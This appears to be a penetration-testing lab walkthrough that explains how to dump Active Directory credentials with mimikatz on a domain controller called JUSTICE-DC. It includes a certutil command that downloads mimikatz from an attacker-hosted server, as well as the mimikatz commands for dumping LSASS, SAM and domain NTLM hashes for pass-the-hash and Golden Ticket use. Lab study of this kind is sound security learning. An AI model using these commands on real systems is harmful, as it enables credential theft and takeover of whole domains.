# Dumping Credentials using MIMIKATZ

As we discussed before `mimikatz` is a post compromise tool that require an valid user shell. In the previous URL File attack, we have already compromised the Domain Administrator account. <br>
By using his credentials we can get a shell on the domain controller (JUSTICE-DC) and then load `mimikatz` to dump the hashes of other interesting domain accounts.

### TRANFERRING MIMIKATZ EXECUTABLE TO TARGET:

To execute `mimikatz` on the target we need to first transfer the executable file onto the target.
Its always a best practise to use the `/temp` folder under `C:\` drive to store all the scripts and executables that we use on the target.

To transfer the executable, I hosted the directory using python HTTP server and then used `certutil` command on the target shell to download the `mimikatz.exe` file

ON ATTACK SIDE: Host the directory with `mimikatz.exe`. In Kali it can be found under `/usr/share/windows-resources`.
```
python3 -m http.server 80
```

ON TARGET SHELL: Navigate to `C:\temp` directory and download the file.
```
certutil -urlcache -f http://<ATTACKER IP>/mimikatz.exe mimikatz.exe
```

### CREDENTIAL DUMPING
#### 1. GAIN PRIVILEGE TO DUMP CREDENTIALS:

```bash 
privilege::debug
```
This command will allows us to debug a process that we don't have access to. In simple words, it bypasses the memory protection for the `lsass.exe` process to dump credentials in it.

#### 2. DUMPING HASHED PASSWORDS FROM LSASS:

```
sekurlsa::logonpasswords 
```
This command will list the stored login password hashes of all user accessing that have previously logged into `JUSTICE-DC`. If you are on a Domain controller shell you can use this to gain the stored password hash of the Administrator.

Similarly if we were attempting this on any other machine on the domain (For Ex: `BATMAN`) where the Administrator have logged in. this command will dump the admin's NTLM hash. This means that the shell doesn't have to be always the Domain Controller.

#### 3. EXTRACTING LOCAL USER HASHED FROM SAM DATABASE:

```
lsadump::sam
```
This command will dump the password hashes of all local users present in that particular machine like guest, local admin, local user account etc..<br>
This command also dumps other important about the target like `Syskey`, SAM Key, Local SID etc..

#### DUMPING CREDETIALS OF OTHER DOMAIN USERS:

```
lsadump::lsa /patch
```
Currently we have an Administrator shell on the domain controller (JUSTICE-DC). if we run this command it will dump the NTLM hash of all users available on the domain.

Since these are NTLM, we can crack the hash or pass it to laterally move to other systems and compromise other users on the domain.

From the output, we got to know few accounts that we had no idea that they existed on the domain.
- One is the Clark Kent's account: `superman` which is the cop of the Administrator account and has all the privileges on the domain.
- Another one is the `SQLService` account which is also a Domain Admin account.
- Then we have the `krbtgt` account which is used by the Kerberos service for creation and distribution of tickets. this is a very important account when it comes to Golden ticket attack.
